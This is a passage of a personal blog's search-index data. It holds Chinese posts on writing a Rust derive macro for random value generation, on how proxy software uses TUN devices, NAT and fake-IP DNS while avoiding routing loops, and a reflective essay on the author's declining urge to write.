","date":"2022-03-31","objectID":"https://zu1k.com/posts/coding/i-love-rust-proc_macro/:2:1","series":null,"tags":["coding","macro"],"title":"我爱 Rust 过程宏","uri":"https://zu1k.com/posts/coding/i-love-rust-proc_macro/#定义derive宏"},{"categories":["coding"],"content":"解析与生成 在拿到抽象语法树后，顶层便是 Instruction，根据思路我们应该遍历其所有的成员，分析成员的类型并根据相关信息生成代码。 成员可能有三种类型: Named: 带名称的，类似于 Named { x: u8, y: i32} Unnamed: 不带名称的，类似于 Unamed(u8, i32) Unit: () 类型 对于 Named 和 Unamed 两种类型，都需要遍历其所有元素，递归的生成代码，用 __rng.gen() 来初始化数据。 最后判断枚举类型成员数量，生成 match 语句。 let rand = if let syn::Data::Enum(ref data) = ast.data { let ref virants = data.variants; let len = virants.len(); let mut arms = virants.iter().map(|variant| { let ref ident = variant.ident; match \u0026variant.fields { syn::Fields::Named(field) =\u003e { let fields = field .named .iter() .filter_map(|field| field.ident.as_ref()) .map(|ident| quote! { #ident: __rng.gen() }) .collect::\u003cVec\u003c_\u003e\u003e(); quote! { #name::#ident { #(#fields,)* } } } syn::Fields::Unnamed(field) =\u003e { let fields = field .unnamed .iter() .map(|field| quote! { __rng.gen() }) .collect::\u003cVec\u003c_\u003e\u003e(); quote! { #name::#ident (#(#fields),*) } } syn::Fields::Unit =\u003e quote! { #name::#ident }, } }); match len { 1 =\u003e quote! { #(#arms)* }, 2 =\u003e { let (a, b) = (arms.next(), arms.next()); quote! { if __rng.gen() { #a } else { #b } } } _ =\u003e { let mut variants = arms .enumerate() .map(|(index, arm)| quote! { #index =\u003e #arm }) .collect::\u003cVec\u003c_\u003e\u003e(); variants.push(quote! { _ =\u003e unreachable!() }); quote! { match __rng.gen_range(0..#len) { #(#variants,)* } } } } } else { unimplemented!() }; ","date":"2022-03-31","objectID":"https://zu1k.com/posts/coding/i-love-rust-proc_macro/:2:2","series":null,"tags":["coding","macro"],"title":"我爱 Rust 过程宏","uri":"https://zu1k.com/posts/coding/i-love-rust-proc_macro/#解析与生成"},{"categories":["coding"],"content":"我讨厌递归 紧接着就会发现，上面在 Named 和 Unamed 的部分进行递归 __rng.gen()，需要其使用的类型也实现相应的 trait。除去已有的对基本类型的实现外，剩下的类型就需要我们手动实现，这也就要求我们的过程宏也能应用在其他结构上。 因此我们的函数需要进行修改，以处理其他非枚举类型：结构体和元组（元组在我的需求中没用到，就不实现了）。 let rand = match ast.data { syn::Data::Struct(ref data) =\u003e { let fields = data .fields .iter() .filter_map(|field| field.ident.as_ref()) .map(|ident| quote! { #ident: __rng.gen() }) .collect::\u003cVec\u003c_\u003e\u003e(); quote! { #name { #(#fields,)* } } } syn::Data::Enum(ref data) =\u003e { // 刚刚的方法拿进来 } _ =\u003e unimplemented!(), }; 测试，发现 459 个成员通过了 458 个，剩下的那一个成员是 Cow 类型的。是真的烦，没办法给 Cow 实现这个 trait，甚至理论上根本没办法生成一个随机的 Cow，因为其根本不拥有数据，它只有指针。 我马上想到了一个解决方案，牺牲一点性能，用 Vec 替换掉 Cow。虽然我们仍然无法给 Vec 实现这个 trait（因为 Vec 是外部定义的），但是我可以在解析的时候判断一下类型，如果是 Vec 就手动生成随机长度的随机数据，我真是个小机灵鬼。 let fields = field .unnamed .iter() .map(|field| { if inner_type_is_vec(\u0026field.ty) { quote! {{ let i = __rng.gen_range(0..100); __rng.sample_iter(::rand::distributions::Standard) .take(i) .collect() }} } else { quote! { __rng.gen() } } }) .collect::\u003cVec\u003c_\u003e\u003e(); fn inner_type_is_vec(ty: \u0026syn::Type) -\u003e bool { if let syn::Type::Path(syn::TypePath { ref path, .. }) = ty { if let Some(seg) = path.segments.last() { return seg.ident == \"Vec\" } } false } 测试，全部通过！开心！ ","date":"2022-03-31","objectID":"https://zu1k.com/posts/coding/i-love-rust-proc_macro/:2:3","series":null,"tags":["coding","macro"],"title":"我爱 Rust 过程宏","uri":"https://zu1k.com/posts/coding/i-love-rust-proc_macro/#我讨厌递归"},{"categories":["coding"],"content":"总结 学习过程宏，写过程宏、写测试用例，到最后测试通过，着实花了不小功夫。原本还挺有成就感的，直到刚刚，我发现虽然 rand 不再维护这个 derive宏了，但是有一个第三方维护的版本，测试了一下，除了有几个测试用例过不了，在我目前的需求上完全可用。真是痛苦，如果早点发现就好了，又是造轮子的下午。不过幸亏最终结果是好的，通过编写过程宏，用 100 行代码完成了需要 2k+ 行代码的任务，最重要的是不再枯燥。 Rust 的宏机制真的强大，利用好可以做很多有意思的事。例如目前的变长参数函数还有序列化反序列化，在Rust中都是通过过程宏实现的。通过过程宏可以将其他语言中很多需要在运行时进行的工作提前到编译期进行，明显的提高了Rust程序的性能和灵活性，为我们提供了强大的表达和实现能力。 我突然想到，可以用宏来做代码混淆和字面量加密，后面尝试一下。 ","date":"2022-03-31","objectID":"https://zu1k.com/posts/coding/i-love-rust-proc_macro/:3:0","series":null,"tags":["coding","macro"],"title":"我爱 Rust 过程宏","uri":"https://zu1k.com/posts/coding/i-love-rust-proc_macro/#总结"},{"categories":["coding"],"content":"TUN 是内核提供的三层虚拟网络设备，由软件实现来替代真实的硬件，相当于在系统网络栈的三层(网络层)位置开了一个口子，将符合条件(路由匹配)的三层数据包交由相应的用户空间软件来处理，用户空间软件也可以通过TUN设备向系统网络栈注入数据包。可以说，TUN设备是用户空间软件和系统网络栈之间的一个通道。 TAP 是二层(以太网)虚拟网络设备，处理的是以太帧，更加底层可以拿到更多信息，但不在本文的讨论范围。 我们想要利用TUN来做一些事情，实际上就是要编写一个用户态程序，拿到 TUN 设备句柄，向其写入序列化的IP数据包，从中读取数据并还原成IP数据包进行处理，必要时需要取出其payload继续解析为相应传输层协议。 通常使用 TUN 技术的是 VPN 和代理程序，然而这两类程序在对待 TUN 中传递的 IP 数据包时通常有不同的行为： VPN 通常做网络层的封装：将拿到的 IP 包进行加密和封装，然后通过某个连接传输到另一个网络中，在解封装和解密后，将 IP 包发送到该网络。在这个过程中，对 IP 包本身的修改是非常小的，不会涉及到整体结构的变动，通常仅会修改一下源 IP 和目标 IP ，做一下 NAT。 代理程序 通常是传输层的代理：在从 TUN 设备拿到 IP 包后，需要继续解析其 payload，还原出 TCP 或者 UDP 结构，然后加密和封装传输层 (TCP或UDP) 的 payload。网络层的 IP 和传输层的端口信息通常会作为该连接的元数据进行处理，使用额外的加密和封装手段。 简单来说，VPN 不需要解析 IP 包的 payload，而代理程序需要解析出传输层信息并处理，特别是像 TCP 这样复杂的协议，对其处理更是需要非常小心和严谨。对于代理程序这样的需求，如果我们使用 TUN 技术，通常有两种模式：在用户态实现网络栈，或者直接利用操作系统网络栈实现。 ","date":"2022-03-22","objectID":"https://zu1k.com/posts/coding/tun-mode/:0:0","series":null,"tags":["coding","tun","proxy"],"title":"使用 TUN 的模式","uri":"https://zu1k.com/posts/coding/tun-mode/#"},{"categories":["coding"],"content":"用户态网络栈 第一种选择是在用户态实现网络栈，这是不小的工程啊，特别是实现 TCP 协议，因为其协议非常复杂，实现起来有很多细节需要注意，所以自己实现非常容易犯错。所以我们一般会直接找现成的实现来用，现有不少比较成熟且高效的实现，我相信肯定比我自己写的要好几个数量级。 ","date":"2022-03-22","objectID":"https://zu1k.com/posts/coding/tun-mode/:1:0","series":null,"tags":["coding","tun","proxy"],"title":"使用 TUN 的模式","uri":"https://zu1k.com/posts/coding/tun-mode/#用户态网络栈"},{"categories":["coding"],"content":"网络栈实现 如果使用 C 语言，lwIP 是一个非常不错的选择，由瑞典计算机科学研究所科学院开源，这是一个轻量级的 TCP/IP 栈实现，在占用超少内存的情况下，实现了完整的 TCP，被广泛应用到嵌入式设备中，稳定性有保证。同时，lwIP 有很多其他语言的绑定，包括 go 和 rust，这使我们在使用其他语言开发时也可以选择 lwIP 作为用户态网络栈实现。 如果选择使用 Go 语言开发 TUN 的用户态程序(其实这也是大多数人的选择)，可以选择 Google 开源的 gVisor 中的实现，gVisor项目目的是为容器提供自己的应用程序内核，其中 tcpip 的实现有 Google 背书，质量有保证。 如果选择使用 Rust 进行开发，我们的选择就会困难一点，并没有一个饱经风霜、经过时间检验的实现，在广泛对比之后我推荐 smoltcp，这是为裸机实时系统开发的独立的、事件驱动的 TCP/IP 栈，其设计目标是简单和健壮，应该可以信任吧。 当然，我觉得还有一个可以期待的实现，就是 Google 为 Fuchsia 操作系统开发的 Netstack3，之前是由 Go 实现的，不过现在 Google 用 Rust 重新实现了一个新的，谷歌背书，可以期待。 ","date":"2022-03-22","objectID":"https://zu1k.com/posts/coding/tun-mode/:1:1","series":null,"tags":["coding","tun","proxy"],"title":"使用 TUN 的模式","uri":"https://zu1k.com/posts/coding/tun-mode/#网络栈实现"},{"categories":["coding"],"content":"使用流程 在看完可供选择的实现后，我们来看一下在用户空间实现的网络栈如何使用。虽然不同在不同实现下，各个库有不同的编程接口和使用方法，但基本的思路都是一致的，这里我们便仅讨论基本使用流程。 基本思路 从原理上来讲，用户态网络栈就是要不断通过协议解析，从 IPv4 数据包中不断解析出 TCP 流中的载荷数据；将传输层载荷通过不断的协议封装，拿到最终的 IPv4 数据包。 从 TUN 往外读 从 TUN 设备所对应的句柄中读出了一段字节序列，便是需要处理的IP数据包，一般是 IPv4 协议，不过还是需要先根据字节序列的第一个字节进行判断。 如果判断为 IPv4 包，就将整个字节序列扔到 IPv4 的 Packet Parser 实现中，还原出 IPv4 数据包结构。根据 IPv4 Header 中的 protocol 字段，判断 payload 应该使用哪个上层协议解析。rfc791 一般仅需要处理 ICMP、TCP、UDP 这三种协议，拿 TCP 为例，只需要将 IPv4 的 payload 扔到 TCP 的 Parser 中，即可取出我们想要的传输层载荷。（实际情况当然没有说的这么简单） 向 TUN 写数据 写的过程其实就是读的过程反过来，拿到的是某个传输层协议的 payload，就拿UDP为例，根据该数据报的元信息，构建出完整的 UDP Header，然后将 payload 内容拼接进去。 接下来构建 IPv4 Header，然后将 UDP 报文拼接进 IPv4 payload 中。在拿到 IPv4 数据包后，即可序列化为字节序列，写入 TUN 句柄了。 实际使用 上面的读、写过程看起来简单，但实际需要考虑的东西非常多，包括但不限于分片、丢包、重传、流量控制等等，TCP 作为一个极其复杂的传输层协议，有巨多情况需要考虑，很明显用上面的基本思路是非常繁琐并且难以使用的。 众多用户态网络栈肯定考虑到了这一点，实现都提供了非常友好且直接的接口，可以直接创建一个 TCP/IP 网络栈实例，拿到两个句柄，一端负责读取和写入网络层 IP 数据包，另一端负责接收和写入传输层载荷，中间的复杂转换关系和特殊情况都被内部屏蔽掉了。 ","date":"2022-03-22","objectID":"https://zu1k.com/posts/coding/tun-mode/:1:2","series":null,"tags":["coding","tun","proxy"],"title":"使用 TUN 的模式","uri":"https://zu1k.com/posts/coding/tun-mode/#使用流程"},{"categories":["coding"],"content":"使用流程 在看完可供选择的实现后，我们来看一下在用户空间实现的网络栈如何使用。虽然不同在不同实现下，各个库有不同的编程接口和使用方法，但基本的思路都是一致的，这里我们便仅讨论基本使用流程。 基本思路 从原理上来讲，用户态网络栈就是要不断通过协议解析，从 IPv4 数据包中不断解析出 TCP 流中的载荷数据；将传输层载荷通过不断的协议封装，拿到最终的 IPv4 数据包。 从 TUN 往外读 从 TUN 设备所对应的句柄中读出了一段字节序列，便是需要处理的IP数据包，一般是 IPv4 协议，不过还是需要先根据字节序列的第一个字节进行判断。 如果判断为 IPv4 包，就将整个字节序列扔到 IPv4 的 Packet Parser 实现中，还原出 IPv4 数据包结构。根据 IPv4 Header 中的 protocol 字段，判断 payload 应该使用哪个上层协议解析。rfc791 一般仅需要处理 ICMP、TCP、UDP 这三种协议，拿 TCP 为例，只需要将 IPv4 的 payload 扔到 TCP 的 Parser 中，即可取出我们想要的传输层载荷。（实际情况当然没有说的这么简单） 向 TUN 写数据 写的过程其实就是读的过程反过来，拿到的是某个传输层协议的 payload，就拿UDP为例，根据该数据报的元信息，构建出完整的 UDP Header，然后将 payload 内容拼接进去。 接下来构建 IPv4 Header，然后将 UDP 报文拼接进 IPv4 payload 中。在拿到 IPv4 数据包后，即可序列化为字节序列，写入 TUN 句柄了。 实际使用 上面的读、写过程看起来简单，但实际需要考虑的东西非常多，包括但不限于分片、丢包、重传、流量控制等等，TCP 作为一个极其复杂的传输层协议，有巨多情况需要考虑，很明显用上面的基本思路是非常繁琐并且难以使用的。 众多用户态网络栈肯定考虑到了这一点，实现都提供了非常友好且直接的接口，可以直接创建一个 TCP/IP 网络栈实例，拿到两个句柄，一端负责读取和写入网络层 IP 数据包，另一端负责接收和写入传输层载荷，中间的复杂转换关系和特殊情况都被内部屏蔽掉了。 ","date":"2022-03-22","objectID":"https://zu1k.com/posts/coding/tun-mode/:1:2","series":null,"tags":["coding","tun","proxy"],"title":"使用 TUN 的模式","uri":"https://zu1k.com/posts/coding/tun-mode/#基本思路"},{"categories":["coding"],"content":"使用流程 在看完可供选择的实现后，我们来看一下在用户空间实现的网络栈如何使用。虽然不同在不同实现下，各个库有不同的编程接口和使用方法，但基本的思路都是一致的，这里我们便仅讨论基本使用流程。 基本思路 从原理上来讲，用户态网络栈就是要不断通过协议解析，从 IPv4 数据包中不断解析出 TCP 流中的载荷数据；将传输层载荷通过不断的协议封装，拿到最终的 IPv4 数据包。 从 TUN 往外读 从 TUN 设备所对应的句柄中读出了一段字节序列，便是需要处理的IP数据包，一般是 IPv4 协议，不过还是需要先根据字节序列的第一个字节进行判断。 如果判断为 IPv4 包，就将整个字节序列扔到 IPv4 的 Packet Parser 实现中，还原出 IPv4 数据包结构。根据 IPv4 Header 中的 protocol 字段，判断 payload 应该使用哪个上层协议解析。rfc791 一般仅需要处理 ICMP、TCP、UDP 这三种协议，拿 TCP 为例，只需要将 IPv4 的 payload 扔到 TCP 的 Parser 中，即可取出我们想要的传输层载荷。（实际情况当然没有说的这么简单） 向 TUN 写数据 写的过程其实就是读的过程反过来，拿到的是某个传输层协议的 payload，就拿UDP为例，根据该数据报的元信息，构建出完整的 UDP Header，然后将 payload 内容拼接进去。 接下来构建 IPv4 Header，然后将 UDP 报文拼接进 IPv4 payload 中。在拿到 IPv4 数据包后，即可序列化为字节序列，写入 TUN 句柄了。 实际使用 上面的读、写过程看起来简单，但实际需要考虑的东西非常多，包括但不限于分片、丢包、重传、流量控制等等，TCP 作为一个极其复杂的传输层协议，有巨多情况需要考虑，很明显用上面的基本思路是非常繁琐并且难以使用的。 众多用户态网络栈肯定考虑到了这一点，实现都提供了非常友好且直接的接口，可以直接创建一个 TCP/IP 网络栈实例，拿到两个句柄，一端负责读取和写入网络层 IP 数据包，另一端负责接收和写入传输层载荷，中间的复杂转换关系和特殊情况都被内部屏蔽掉了。 ","date":"2022-03-22","objectID":"https://zu1k.com/posts/coding/tun-mode/:1:2","series":null,"tags":["coding","tun","proxy"],"title":"使用 TUN 的模式","uri":"https://zu1k.com/posts/coding/tun-mode/#实际使用"},{"categories":["coding"],"content":"操作系统网络栈 根据我们的需求，实际就是在 IPv4 和 TCP payload 之间进行转换，而操作系统的网络栈正好就有这个功能，我们无法简单的直接使用操作系统的网络栈代码，但是可以想办法复用操作系统网络栈提供的功能。TUN 在网络层已经打开了一个口子，还需要在传输层也打开一个口子，其实可以利用操作系统提供的 socket。 我们使用操作系统提供的 Socket 创建一个传输层的 Listener，将某个 IPv4 数据包的目标 IP 和目标端口修改为我们监听的 IP 和端口，然后通过 TUN 将该 IPv4 数据包注入到操作系统的网络栈中，操作系统就会自动的进行相应的解析，并将所需要的传输层 payload 通过前面创建的 Socket 发送给 Listener，由此便利用操作系统网络栈完成了 “往外读” 的操作。 对于“向里写”的操作，只需要向刚刚创建的传输层连接句柄写入即可，操作系统的网络栈同样会进行相应的封包，最后形成 IPv4 数据包。很明显，需要考虑反向的数据包，当向传输层连接的句柄中写入数据、操作系统的网络栈封包时，源 IP 和源端口会被视为新的目标 IP 和目标端口，因为我们需要使返回的 IPv4 数据包能够被 TUN 接口捕获到，在上面步骤中就不能只修改目标 IP 和目标端口，同时还要修改源 IP 和源端口，源 IP 应该限制为 TUN 网段中的 IP。 ","date":"2022-03-22","objectID":"https://zu1k.com/posts/coding/tun-mode/:2:0","series":null,"tags":["coding","tun","proxy"],"title":"使用 TUN 的模式","uri":"https://zu1k.com/posts/coding/tun-mode/#操作系统网络栈"},{"categories":["coding"],"content":"工作流程 在利用操作系统网络栈时，通常是以下步骤，这里拿 TCP 协议举例。 在我们的例子中， TUN网络的配置为 198.10.0.1/16，主机IP为 198.10.0.1，代理客户端监听 198.10.0.1:1313，App想要访问 google.com:80，自定义的DNS服务返回google.com的 Fake IP 198.10.2.2。 1. Proxy 创建 TCP Socket Listener 这里首先要在系统网络栈的传输层开个口子，创建一个 TCP Socket Listener，监听 198.10.0.1:1313 2. 某 App 发起连接 当某需要代理的App发起连接，访问 google.com:80，我们通过自定义的 DNS 服务返回一个 Fake IP (198.10.2.2)，使流量被路由到 TUN 设备上。 当然这里也可以不使用 Fake IP 方式来捕获流量，通过配置路由规则或者流量重定向也可以将流量导向 TUN 设备，不过 Fake IP 是最常用的方法，所以这里以此举例。 3. 将 TUN 读取到的 IPv4 解析为 TCP 载荷数据 TUN 设备捕获到流量，也就是 IPv4 数据包，在读取出来后，需要利用系统网络栈解析出 TCP 载荷数据。 这一步，需要将读取到的IPv4数据包进行修改，也就是我们上面说的 源IP、源端口，目标IP和目标端口，还有相应的 checksum 也需要重新计算。修改的目的是让 IPv4 数据包通过 TUN 注入到操作系统网络栈后，能够被正确路由并通过一开始监听的TCP Socket将最里层的 TCP payload 返还给我们。 这里为了方便，直接将源 IP 和源端口设置为初始的目标 IP 和目标端口，在实际编程时，有更多的设置策略，也就是 NAT 策略。 4. 代理客户端请求代理服务器 此时代理客户端已经拿到了请求的真实 TCP 载荷，并且可以通过获取 TCP 连接的 peer 信息得到在第3步修改的源 IP 和源端口，通过这些信息可以通过查 NAT 表得到 App 真正想要访问的 IP 和 端口（甚至可以通过查 DNS 请求记录拿到域名信息），因此代理客户端可以根据自己的协议进行加密和封装等操作，然后发送给代理服务端，由代理服务端进行真实的请求操作。 5. 将返回数据封包回 IPv4 并写入 TUN 通过代理客户端与代理服务端、代理服务端与谷歌的通信，拿到谷歌真正的返回数据，现在需要重新封装回 IPv4 数据包，还是利用系统网络栈：将数据写入 TCP Socket (198.10.0.1:1313) 中，便可以在 TUN 侧拿到封装好的 IPv4，就是这么轻松。 6. App 拿到返回数据 上面的过程便是利用操作系统网络栈完成 IPv4 到 TCP 载荷数据及其反方向转变的过程。通过这种办法，可以充分利用操作系统的实现，都是饱经检验，质量可靠，且满足各种复杂情况。但是也有缺点，数据需要拷贝多次，增加了性能损耗和延迟。 ","date":"2022-03-22","objectID":"https://zu1k.com/posts/coding/tun-mode/:2:1","series":null,"tags":["coding","tun","proxy"],"title":"使用 TUN 的模式","uri":"https://zu1k.com/posts/coding/tun-mode/#工作流程"},{"categories":["coding"],"content":"NAT 策略 我这里想说的 NAT 策略不是指常说的那四种 NAT 类型，当然你可以去实现不同的NAT类型来满足各种各样的需求，但那是更深入的话题，不在本文讨论。 在刚刚的流程的第3步中，你应该发现对源 IP 和源端口的修改是有限制的，我们需要将 IP 限定为 TUN 网段，从而使返回的数据包可以重新被 TUN 设备捕获。但是这种限制是非常宽松的，在我们的例子对 TUN 设备网段的配置中，你有 2^16 个 IP 可供选择，每一个 IP 又有 2^16 个端口可供选择。 但是如果你仔细观察，你会发现上面的例子并没有充分利用这些资源，我们仅仅是将 Fake IP 作为源 IP、真实目标端口作为源端口，而这个 IP 的其他端口都被闲置了。同时我也在其他人写的某些程序中发现，他们仅选择一个 IP 设置为源 IP，通过合理的分配该 IP 的端口作为源端口，在这种情况下， TUN 网段中其余的 IP 资源就被浪费了。 以上两种 NAT 策略在个人电脑上没啥问题，但是如果代理客户端运行在网关上，网络中访问的 IP 数量超过网段中 IP 数量上限，或者 hash(ip:port) 数量超过端口总数(2^16)，就会难以继续分配 NAT 项。因此我们应该专门编写一个 NAT 管理组件，合理分配 IP 和端口资源，争取做到利用最大化。 ","date":"2022-03-22","objectID":"https://zu1k.com/posts/coding/tun-mode/:2:2","series":null,"tags":["coding","tun","proxy"],"title":"使用 TUN 的模式","uri":"https://zu1k.com/posts/coding/tun-mode/#nat-策略"},{"categories":["coding"],"content":"防止环路 抛开事实不谈，如果我们想要代理全部流量，就是要通过路由规则将所有流量导向我们的 TUN 设备，这是很直观且朴素的想法，就像下面的命令一样单纯： sudo route add -net 0.0.0.0/0 dev tun0 如果你真的这么写，你就会发现你上不了网了。这是因为出现了环路。 如果稍微思考一下，你就会发现，虽然我们想要代理所有流量，但是代理客户端与代理服务端的流量却是需要跳过的，如果用上面的路由，就会导致代理客户端发出的流量经过路由然后从 TUN 重新回到了代理客户端，这是一个死环，没有流量可以走出去。流量只近不出，来回转圈，你的文件打开数爆炸，操作系统不再给你分配更多的句柄，数据来回拷贝，你的CPU风扇猛转，电脑开始变卡。 这是我们不想看到的，需要采取一些措施避免环路的产生。在实践中有不少方法可以避免这种情况的发生，例如通过合理的配置路由规则，使连接代理服务器的流量可以顺利匹配到外部网络接口。只不过这种方法不够灵活，如果代理服务器 IP 发生变化则需要及时改变路由规则，非常麻烦，所以我们接下来介绍其他的方法。 ","date":"2022-03-22","objectID":"https://zu1k.com/posts/coding/tun-mode/:3:0","series":null,"tags":["coding","tun","proxy"],"title":"使用 TUN 的模式","uri":"https://zu1k.com/posts/coding/tun-mode/#防止环路"},{"categories":["coding"],"content":"Fake IP Fake IP 就是我们上面例子中用到的方法，这是一种限制进入流量的方法。基本思路是自己实现一个 DNS 服务器，对用户的查询返回一个假的 IP 地址，我们可以将返回的 IP 地址限制为 TUN 设备的网络段，这样应用发起的流量其实便是发给 TUN 网络的流量，自然的被路由匹配，而无需像前面那样路由全部的流量，其余的流量包括代理客户端发起的请求便不会被路由，可以保证不产生环路。 当代理客户端需要知道应用真正想要请求的地址时，就通过一些接口向自己实现的 DNS 服务器进行反向查询即可。 ","date":"2022-03-22","objectID":"https://zu1k.com/posts/coding/tun-mode/:3:1","series":null,"tags":["coding","tun","proxy"],"title":"使用 TUN 的模式","uri":"https://zu1k.com/posts/coding/tun-mode/#fake-ip"},{"categories":["coding"],"content":"策略路由 通过前面的分析，可以发现产生环路是因为代理客户端本身发出的流量被系统路由到 TUN 设备导致的，因此我们可以想办法让代理客户端本身发起的流量不走 TUN 而是从真实的物理网络接口出去。 在 (类)Unix 系统中，可以对代理客户端的流量打上 fwmark 防火墙标记，然后通过策略路由使带有标记的流量走单独的路由表出去，从而绕过全局的流量捕获。 cgroup cgroup 是 Linux 内核的功能，可以用来限制、隔离进程的资源，其中 net_cls 子系统可以限制网络的访问。在网络控制层面，可以通过 class ID 确定流量是否属于某个 cgroup，因此可以对来自特定 cgroup 的流量打上 fwmark，使其能够被策略路由控制。 我们可以创建一个用于绕过代理的 cgroup ，对该 cgroup 下进程的流量使用默认的路由规则，而不在该 cgroup 的其余进程的流量都要路由到 TUN 设备进行代理。 ","date":"2022-03-22","objectID":"https://zu1k.com/posts/coding/tun-mode/:3:2","series":null,"tags":["coding","tun","proxy"],"title":"使用 TUN 的模式","uri":"https://zu1k.com/posts/coding/tun-mode/#策略路由"},{"categories":["coding"],"content":"一些其他的知识 ","date":"2022-03-22","objectID":"https://zu1k.com/posts/coding/tun-mode/:4:0","series":null,"tags":["coding","tun","proxy"],"title":"使用 TUN 的模式","uri":"https://zu1k.com/posts/coding/tun-mode/#一些其他的知识"},{"categories":["coding"],"content":"TUN 与 TAP 的区别 TAP 在2层，读取和写入的数据需要是以太帧结构 TUN 在3层，读取和写入的数据需要是IP数据包结构 ","date":"2022-03-22","objectID":"https://zu1k.com/posts/coding/tun-mode/:4:1","series":null,"tags":["coding","tun","proxy"],"title":"使用 TUN 的模式","uri":"https://zu1k.com/posts/coding/tun-mode/#tun-与-tap-的区别"},{"categories":["coding"],"content":"IP 等配置 在给网卡配置IP时，其实是修改内核网络栈中的某些参数，而不是修改网卡。虽然网卡也会有一些可供修改的配置项，但一般情况是通过其他方法进行修改的(驱动程序)。 ","date":"2022-03-22","objectID":"https://zu1k.com/posts/coding/tun-mode/:4:2","series":null,"tags":["coding","tun","proxy"],"title":"使用 TUN 的模式","uri":"https://zu1k.com/posts/coding/tun-mode/#ip-等配置"},{"categories":["coding"],"content":"物理网卡与虚拟网卡的区别 物理网卡会有 DMA 功能，在启用 DMA 时网卡和网络栈(内存中的缓冲区)的通讯由 DMA 控制器管理，因此性能更高延迟也更低。 ","date":"2022-03-22","objectID":"https://zu1k.com/posts/coding/tun-mode/:4:3","series":null,"tags":["coding","tun","proxy"],"title":"使用 TUN 的模式","uri":"https://zu1k.com/posts/coding/tun-mode/#物理网卡与虚拟网卡的区别"},{"categories":["coding"],"content":"如何创建 TUN 设备 在Linux下一切皆文件，/dev/net/tun 是特殊的字符(char)设备文件，通过打开这个文件获得一个文件句柄，然后通过 ioctl() 系统调用对其进行配置。在这里可以选择打开TUN设备还是TAP设备，可以设置设备名称。 详见：Network device allocation ","date":"2022-03-22","objectID":"https://zu1k.com/posts/coding/tun-mode/:4:4","series":null,"tags":["coding","tun","proxy"],"title":"使用 TUN 的模式","uri":"https://zu1k.com/posts/coding/tun-mode/#如何创建-tun-设备"},{"categories":["coding"],"content":"与 BPF 的关系 BPF 是一种高级数据包过滤器，可以附加到现有的网络接口，但其本身不提供虚拟网络接口。 TUN/TAP 驱动程序提供虚拟网络接口，可以将 BPF 附加到该接口。 ","date":"2022-03-22","objectID":"https://zu1k.com/posts/coding/tun-mode/:4:5","series":null,"tags":["coding","tun","proxy"],"title":"使用 TUN 的模式","uri":"https://zu1k.com/posts/coding/tun-mode/#与-bpf-的关系"},{"categories":["coding"],"content":"扩展阅读 https://www.kernel.org/doc/html/latest/networking/tuntap.html https://github.com/xjasonlyu/tun2socks https://github.com/eycorsican/go-tun2socks https://github.com/gfreezy/seeker https://github.com/shadowsocks/shadowsocks-rust https://www.wintun.net/ ","date":"2022-03-22","objectID":"https://zu1k.com/posts/coding/tun-mode/:5:0","series":null,"tags":["coding","tun","proxy"],"title":"使用 TUN 的模式","uri":"https://zu1k.com/posts/coding/tun-mode/#扩展阅读"},{"categories":["thinking"],"content":" 其实一开始我是想写为什么博客更新越来越慢，但是随着思考的深入，我发现不仅是博客，我在其他地方也越來越封闭，不再表达自己。 翻看近几年我发过的朋友圈，19年1条，20年2条，21年发了3条，而今年仅有一条新年祝福。发朋友圈和说说频率的锐减，我在很早之前就发现了，博客更新频率也在减少，与人倾诉的频率几乎归零。 不知道为什么，随着知识的增加、人生经验的积累，我的表达欲却在慢慢的下降，而现在几乎已经到达一个极低的水平。看似与人交流很多，却未讨论过自己真正关心的事情；经常麻烦别人，却在遇到真正的难题时自己闷头解决；没有什么伤心事，但总觉得自己忧国忧民心怀天下；看了很多思考了很多，却不再表达而是通过阅读寻求认同感；逐渐封闭掉自己的熟人社交，转向匿名化平台发表。 我觉得我变了，我不知道这是一种成长还是一种心理疾病，我思考了很多原因，也许是找了一些借口，我决定将它们写下来。 现在我打开手机的笔记软件，这些想法是我昨晚睡前思考的东西，怕第二天忘记所以及时的记录了下来。在我面前的一连串的“我怕”，但仔细看下来却又觉得自己是多么的幼稚，这些东西有啥好“怕”的，我是在在乎什么，为何不能坦然一点。 我怕文章不够条理 也许你已经发现，我的文章大多都明确的划分段落写上标题，我在特意的理清文章的内容，便于读者阅读。我发现这是一种额外的负担，我是真的想写流水帐，想到什么就写什么，又不是在写书，读者啥的你们会自己去理清楚的。我真想这么做，但又真的不敢，这是一种怎样的束缚，我也说不清楚，就是不敢放开自己。 我怕内容浅显、质量不高 实际上这有点自欺欺人，回过头看看自己已经发布过的内容，大部分都是内容浅显且质量不高吧。即使这样，我在发布和表达之前，都会仔细的审查，查找很多资料，尽可能使内容更加丰富和全面。同时，我又觉得这是一种枷锁，是一种表面上的全面，实际上难以深入下去，我有读一些大佬写的内容，他们往往只针对某一个特定的小问题，进行非常深入深刻的思考和讨论，通常可以启发读者，使人醍醐灌顶、理解通透并举一反三。 比如要说eBPF这个技术，我现在的稿子是，先对比Linux内核模块，然后从BPF的起源、历史，技术原理，应用范围，到已有的开源应用和其在安全领域的应用，我发现我几乎就是在抄袭eBPF的官方文档，缺乏自己的思考和深入的探究。eBPF的应用范围很广，仅在网络流量的分析、处理领域就有很多的内容可写，而我若总想着全面和丰富，就势必难以面面深入，使文章看起来像是在洗稿。这篇关于eBPF的“全面”的文章可能不会发布了，不过我想可能会拿来用作内部分享给不了解的人，使其有个大概的认识。我会单独重新写一篇，专注我所关心的与安全相关的应用。 我怕内容很快过时 我曾经阅读过不少内容，在经过区区几年就完全过时，我害怕自己写的内容也有这样的情况，所以我想尽可能的写原理性的东西，但又感觉自己肚子里没有什么墨水。这是一种非常纠结的心情，明明自己有不少实践经验，但这些经验往往依附于特定条件和环境，分享出去会帮助到人但也仅仅在那个时间段会有用，而要讲原理却难以深入下去，总感觉那些东西的原理又很浅显。 我想写一些教程类的东西，但是又害怕写这类东西，因为在我的评判标准里，教程是没有技术含量的，在我的认知里，看这种第三方的教程不如直接看文档，其中一个很重要的原因就是时效性，不想让别人搜到我的文章，看完后一大骂一句“干，都什么年代了，还用这个方法”。 我怕暴露自己的无知 我想表现的像一个长者，但是我的知识和经历无法支撑我做到。认识到自己的无知，已经是很大的进步。我想到了罗翔老师曾经的一个视频，也记得苏格拉底说过的话。我要正视自己的无知，认识到人本身的局限性，并发挥自己的主观能动性，努力提升自我获得进步。 我怕不被理解 